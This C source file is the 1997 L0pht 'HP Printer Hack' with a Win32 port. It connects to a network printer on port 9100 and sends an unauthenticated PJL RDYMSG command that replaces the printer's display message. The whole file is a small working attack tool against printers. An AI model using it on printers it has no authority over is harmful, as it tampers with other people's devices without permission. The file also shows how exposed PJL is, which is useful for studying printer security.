/* 
   HP Printer Hack
   12/8/97 sili@l0pht.com

   Win32 port March 11,1998 by anonymous
*/

#ifndef WIN32
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#else
#include <winsock.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#endif

#define PORT 9100

int main (int argc, char *argv[]) {

#ifndef WIN32
  int sockfd;
#else
  SOCKET sockfd;
  WSADATA wsaData;
#endif

  int bytes_sent;   /* Sock FD */
  struct hostent *host;   /* info from gethostbyname */
  struct sockaddr_in dest_addr;   /* Host Address */
  char line[100];
  
#ifdef WIN32
  if (WSAStartup(0x202,&wsaData) == SOCKET_ERROR) {
	fprintf(stderr,"WSAStartup failed with error %d\n",WSAGetLastError());
	WSACleanup();
	return -1;
  }
#endif

  if (argc !=3) {
    printf("HP Display Hack\n--sili@l0pht.com 12/8/97\n\n%s printer \"message\"\n",argv[0]);
    printf("\tMessage can be up to 16 characters long\n");
#ifdef WIN32
	WSACleanup();
#endif    
	exit(1);
  }

  if ( (host=gethostbyname(argv[1])) == NULL) {
    perror("gethostbyname");
#ifdef WIN32
	WSACleanup();
#endif    
	exit(1);
  }

  printf ("HP Display hack -- sili@l0pht.com\n");
  printf ("Hostname:   %s\n", argv[1]);
  printf ("Message: %s\n",argv[2]);

#ifndef WIN32
  bzero(&(dest_addr.sin_zero), 8);  /* Take care of  sin_zero  ??? */
  /* Prepare dest_addr */
  bcopy(host->h_addr, (char *) &dest_addr.sin_addr, host->h_length);
#else
  memset(&dest_addr,0,sizeof(dest_addr));
  memcpy(&(dest_addr.sin_addr),host->h_addr,host->h_length);	
#endif

  /* Prepare dest_addr */
  dest_addr.sin_family= host->h_addrtype;  /* AF_INET from gethostbyname */
  dest_addr.sin_port= htons(PORT) ; /* PORT defined above */

/* Get socket */
/*  printf ("Grabbing socket....\n"); */
  if ((sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {
    perror("socket");
#ifdef WIN32
	WSACleanup();
#endif
    exit(1);
  }

  /* Connect !*/

  printf ("Connecting....\n");
  
  if (connect(sockfd, (struct sockaddr *)&dest_addr,sizeof(dest_addr)) == -1){
    perror("connect");
#ifdef WIN32
	WSACleanup();
#endif    
    exit(1);
  }

  /* Preparing JPL Command */
  
  strcpy(line,"\033%-12345X@PJL RDYMSG DISPLAY = \"");
  strncat(line,argv[2],16);
  strcat(line,"\"\r\n\033%-12345X\r\n");

  /* Sending data! */

/*  printf ("Sending Data...%d\n",strlen(line));*/
/*  printf ("Line: %s\n",line); */
  bytes_sent=send(sockfd,line,strlen(line),0);
  
  printf("Sent %d bytes\n",bytes_sent);
#ifdef WIN32
  closesocket(sockfd);
  WSACleanup();
#else
  close(sockfd);
#endif
  exit(0);
}
